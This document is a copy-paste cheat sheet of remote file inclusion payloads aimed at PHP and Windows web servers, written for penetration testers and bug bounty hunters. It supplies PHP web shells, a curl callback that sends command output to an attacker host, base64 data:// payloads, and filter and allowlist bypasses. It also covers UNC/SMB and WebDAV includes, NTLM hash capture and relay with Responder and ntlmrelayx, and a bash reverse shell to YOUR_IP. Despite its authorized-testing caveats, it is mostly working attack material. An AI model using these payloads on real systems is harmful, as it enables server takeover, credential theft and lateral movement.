# RFI Arsenal — Remote-Include Payloads, Suffix-Defeats & Shell-Host Snippets (copy-paste)

**Author:** x8bitranjit

> Companion to `RFI_TESTING_GUIDE.md`. Authorized testing only — **benign markers**, clean up (Guide §19).
> RFI = your code **executes** on the target (RCE). A mere fetch is **SSRF** — prove execution (Guide §4/§15).

---

## §0.0 — The whole attack in one sequence

*What & when:* the entire RFI run on one screen — the **decision spine** you actually follow. RFI is not "spray payloads"; it's a short ladder gated by one config (`allow_url_include`) and one OS fact (Windows treats UNC as a local path). Prove **execution** (not fetch), and if the naïve remote include is blocked, walk the rungs *in order* — each has different prerequisites. The moment a Linux `allow_url_include=Off` box refuses every rung, it's no longer RFI: hand the same sink to the **LFI kit**.

```
# ── 1. RECON the sink (Guide §3) ──────────────────────────────────────────
?page= / ?file= / ?template= / ?lang= / ?module= …   → any param whose value looks like a file/module name
#   confirm it's a file-inclusion sink:  ?page=/etc/passwd  (or ?page=C:\windows\win.ini on Windows)

# ── 2. PROVE FETCH (Guide §4) — this is only SSRF-grade, don't stop here ───
?page=http://YOUR_OOB/probe.txt        → OOB hit from the TARGET's egress IP = it fetched. (fetch ≠ RFI yet)

# ── 3. PROVE EXECUTION (Guide §4/§11) — THIS is RFI ───────────────────────
host  p.txt = <?php echo "RFI-EXEC-".(7*7*7); ?>   (served as text/plain)
?page=http://YOUR_OOB/p.txt?           → response shows "RFI-EXEC-343" (COMPUTED) = RCE. allow_url_include is ON.
#   ? / %23 / %00 after the URL defeat a forced ".php" suffix (Guide §6)

# ── 4. BLOCKED? walk the ladder IN ORDER (Guide §7–§11.1) ─────────────────
allow_url_include ON + word-filter?  → allowlist-substring:  http://TRUSTED.YOUR_OOB/p.txt   (the TimThumb bug, §8)
                                        scheme/case/enc:      hTTp:// · http:\\ · %68%74%74%70 · ftp:// · //YOUR_OOB/p.txt
allow_url_include ON + no HTTP egress → data://text/plain;base64,<PD9waHA…>   ·   php://input + POST body <?php system("id");?>
allow_url_include OFF + Windows       → ?page=\\YOUR_OOB\share\shell.php   (UNC = local path; + NetNTLM to Responder §10.1)
                                        SMB blocked? WebDAV:  \\YOUR_OOB@80\dav\shell.php  (§10.2)
allow_url_include OFF + Linux         → remote include is DEAD → PIVOT the SAME sink to the LFI kit (../LFI/)

# ── 5. RCE proof, then STOP (Guide §12/§19) ──────────────────────────────
p.txt = <?php system("id"); ?>   → uid=… output = complete Critical. No shell/exfil for bounty. Clean up.
```

> **Cash-out map:** execution proven → **RCE / full server compromise (Critical, CWE-98)** → read app config/`.env` → DB & cloud creds (read-only, redact) → lateral/cloud pivot (SSRF-kit discipline). Windows UNC even *without* execution → **NetNTLM capture → crack/relay**. Only a *fetch*, no execution? File it as **SSRF**, not RFI.

---

## 1. Benign proof payloads to HOST (serve as text/plain)

> **What & when:** these are the *recipe cards you put on your own server* for the target's chef to cook. Start with the arithmetic one every time (`echo 7*7*7`) — it's how you prove *cooking happened* vs a mere fetch. Escalate to the command card (`system`) only after cooking is confirmed, and use the callback/`sleep` cards when you can't see the output (blind). Serve all of them as **text/plain** so your own box doesn't cook them first.

```php
# shell.txt  — execution proof (prints RFI-EXEC-343 only if PHP RAN)
<?php echo "RFI-EXEC-".(7*7*7); ?>

# cmd.txt  — command execution
<?php system($_GET['c']); ?>

# blind proof (callback carries command output → proves EXECUTION not just fetch)
<?php system('curl -s http://YOUR_OOB/exec_$(id|tr " " "_")'); ?>

# time-based blind proof
<?php sleep(10); ?>
```
Host with: `python3 poc/payload_host.py --port 8000` (sets `Content-Type: text/plain` + logs hits).

## 2. Core remote-include payloads (Guide §5/§6)

> **What & when:** the classic "mail the card from my website" set — use when `allow_url_include=On` (or you don't yet know). Try the plain URL first; the moment you see the app forcing a `.php` suffix, switch to the **`?` variant** (it swallows the appended `.php`) — that's your default and most reliable line. `%23`/`%00` are fallbacks; the scheme swaps (`https`/`ftp`) and `:80` are for when a scheme or high port is filtered. Append `&c=id` once you move to the command card.

```
?page=http://YOUR_IP:8000/shell.txt                 # plain (no forced suffix)
?page=http://YOUR_IP:8000/shell.txt?                # ? swallows an appended ".php"   ★ most reliable
?page=http://YOUR_IP:8000/shell.txt%23              # # (fragment) swallows ".php"
?page=http://YOUR_IP:8000/shell.txt%00              # null byte (PHP < 5.3.4)
?page=http://YOUR_IP/shell.txt%253f                 # double-encoded ?
?page=https://YOUR_IP/shell.txt?                    # https variant
?page=ftp://YOUR_IP/shell.txt?                       # ftp variant
?page=http://YOUR_IP:80/shell.txt?                   # use :80 if high ports are egress-blocked
# then add the command:  &c=id
```

## 3. Scheme / encoding bypasses (Guide §7)

```
hTtP://YOUR_IP/shell.txt?            # case
http:/\YOUR_IP/shell.txt?            # slash confusion
http://0xC0A80001/shell.txt?         # hex IP host (SSRF kit §6)
http://3232235521/shell.txt?         # decimal IP host
http://YOUR_IP%2fshell.txt           # encoded slash
smb://YOUR_IP/share/shell.php        # smb scheme (some configs)
```

## 4. data:// / php://input / expect (no remote URL — Guide §9)

> **What & when:** reach for these the instant `http://` is refused (`allow_url_include=Off`) — they hand the chef a card *without any website at all*, so the "no remote URLs" rule doesn't apply. `data://` writes the whole card inline in the URL; `php://input` puts it in your POST body; `expect://` runs a command directly. They need only the one vulnerable parameter (no reachable payload host), which is why they're the most common way RFI "still works" on modern PHP. Test `data://` first as your quick `allow_url_include` check.

```
# data:// (base64 = <?php system($_GET['c']);?>)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id

# php://input — PHP in the POST body
?page=php://input        (POST body:)  <?php system($_GET['c']); ?>     (?c=id)

# expect://
?page=expect://id
```
base64 helper:
```bash
echo -n '<?php system($_GET["c"]); ?>' | base64    # PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==
```

## 5. Windows UNC / SMB include (Guide §10)

> **What & when:** the Windows-target path, and it **ignores `allow_url_include` entirely** (Windows treats `\\host\share` as a local file, not a URL). Use it whenever the target is Windows and `http://` RFI is blocked. Stand up a fake share (`impacket-smbserver`), drop your `shell.php` in it, and point the include at `\\YOUR_IP\share\shell.php`. Needs outbound SMB/445 (common internally; if blocked, jump to §5c WebDAV). Bonus: it also leaks the NTLM hash (§5b) even if the file never runs.

```
# host the share (Kali/WSL):
impacket-smbserver share ./www -smb2support          # put shell.php (PHP) in ./www
# include over UNC (Windows PHP, no allow_url_include needed):
?page=\\YOUR_IP\share\shell.php                       # raw
?page=%5c%5cYOUR_IP%5cshare%5cshell.php               # url-encoded
?page=\\YOUR_IP\share\shell.php%00
```

## 5b. NTLM hash capture & relay — payoff even WITHOUT execution (Guide §10.1)
> **What & when:** the consolation prize — use whenever a Windows UNC include *connects* but you can't confirm the file ran (or the program disputes RCE). Windows introduces itself with its account credentials the moment it touches your share, so just pointing the include at `\\YOUR_IP\x` with Responder listening captures the NetNTLMv2 hash → crack (`hashcat -m 5600`) or, on authorized red-team, relay it live (`ntlmrelayx`) to another service for exec/DCSync. Report it as an auth-coercion/SSRF finding even with zero execution.
```
# the UNC fetch authenticates the target's machine/service account to YOUR server BEFORE the file runs:
sudo responder -I eth0                                 # captures NetNTLMv2 when the include opens \\YOUR_IP\x
?page=\\YOUR_IP\x                                      # → Responder logs the hash + the target's source IP
hashcat -m 5600 ntlm.txt rockyou.txt                   # crack the NetNTLMv2 offline
# RELAY (authorized red-team — no cracking):
ntlmrelayx.py -smb2support -t ldap://<DC>              # or -t smb://<host> / -t http://<host> → exec/DCSync/AD takeover
?page=\\YOUR_IP\x                                      # the coerced auth is relayed to the target service
```

## 5c. WebDAV over HTTP(S) — when SMB/445 egress is blocked (Guide §10.2)
```
# Windows redirector falls back to WebDAV; outbound 80/443 is almost always allowed:
?page=\\YOUR_IP@80\share\shell.php                     # UNC over WebDAV (HTTP/80)
?page=\\YOUR_IP@SSL@443\share\shell.php                # UNC over WebDAV (HTTPS/443)
?page=%5c%5cYOUR_IP@80%5cshare%5cshell.php             # url-encoded
# host a WebDAV server (wsgidav / Responder WebDAV) serving shell.php → executes (RFI→RCE) AND leaks the NetNTLM hash.
```

## 6. Allowlist / host-filter bypass (Guide §8)

> **What & when:** use when the include *validates* the host (only "allowed" domains). Each line matches a specific weak check: the **open-redirect bounce** (validate an allowed host, but it redirects the fetcher to your file) is the cleanest and works whenever the fetcher follows redirects; the subdomain/`contains`/`@` tricks match "startsWith"/"contains"/prefix checks respectively. These reuse the SSRF kit's parser-confusion set — stack them with the `?` suffix-defeat from §2.

```
?page=https://allowed.com/redirect?url=http://YOUR_IP/shell.txt?     # open redirect on allowed host (server follows)
?page=http://allowed.com.YOUR_DOMAIN/shell.txt?                       # "startsWith allowed" (you own *.YOUR_DOMAIN)
?page=http://YOUR_IP/allowed.com/shell.txt?                           # "contains allowed"
?page=http://allowed.com@YOUR_IP/shell.txt?                          # @-confusion (validator vs fetcher)
```

## 7. RCE → shell (authorized engagements only — Guide §11)

> **What & when:** the commands you feed the cooked card once execution is confirmed. For **bug bounty, stop at the top three** — a single `id`/`whoami`/`hostname` output *is* the Critical proof; you don't need (and shouldn't drop) a reverse shell. The reverse-shell line is for **explicitly authorized red-team** only, and you clean it up afterward.

```
&c=id                                  # benign proof (use first)
&c=whoami
&c=hostname
&c=uname -a
# reverse shell (explicit authorization only; bug bounty: a single `id` is enough):
&c=bash -c 'bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261'     # (%26 = &)
```

## 8. Other stacks (Guide §14)

```
JSP:        ?page=http://YOUR_IP/shell.jsp        (host a JSP)
ColdFusion: ?template=http://YOUR_IP/shell.cfm
Node:       (dynamic require/import of user input) → remote/poisoned module → RCE
Python:     template-include from URL → usually SSTI → SSTI kit
```

## 8b. Real-world RFI surfaces, CVEs & chains (guide §3/§14) + references
```
□ Legacy PHP apps / abandoned plugins & themes with include($_GET[...]) and allow_url_include=On (WordPress plugins,
   osCommerce, Joomla extensions, old TimThumb-era code) — the classic mass-exploited RFI.
□ allow_url_include=Off (modern default) → RFI "still works" via data:// / php://input (§4) and, on Windows, UNC/SMB (§5).
□ ColdFusion <cfinclude template="#url.x#"> ; JSP <jsp:include page="<url>"/> / <c:import url=> → host .cfm/.jsp → RCE.
□ Node dynamic require(userInput) / import(userInput) ; Python __import__/importlib of user input → remote/poisoned module.
□ Windows UNC include + Responder/impacket-smbserver → RCE AND NTLM hash capture (relay to other hosts).
□ Open-redirect-on-allowed-host → smuggle your payload URL past a host allowlist (§6) → RFI.
□ RFI confused with SSRF: a fetch with NO execution is SSRF (SSRF kit), not RFI — prove execution (echo 7*7*7) (§1).
□ Chain: RFI → web shell → read config/.env → DB/cloud creds → cloud takeover (SSRF kit §11 discipline).
```
> **References:** PortSwigger *File inclusion*, PayloadsAllTheThings *File Inclusion* (RFI section), HackTricks *LFI/RFI*,
> OWASP WSTG (Remote File Inclusion), `kurobeats/fimap`, impacket-smbserver/Responder, Hackviser & PentesterLab
> file-inclusion modules. PHP `allow_url_include`/`allow_url_fopen` docs.

---

## 9. Triage rules (don't waste a report)

```
your CODE executed (computed marker / cmd output)    → REPORT RFI → RCE = Critical (benign marker + id; clean up)
data:// / php://input / UNC executed your PHP         → REPORT RFI → RCE = Critical
server only FETCHED your URL (no execution)           → it's SSRF → SSRF kit (NOT an RFI report)
raw <?php text shown in the page                      → non-exec include → maybe stored XSS/info, not RCE
http:// blocked and you stopped                       → test data:// / php://input / UNC before giving up
blind hit only, no execution proof                    → prove exec (callback-with-output/sleep) or it's SSRF
```
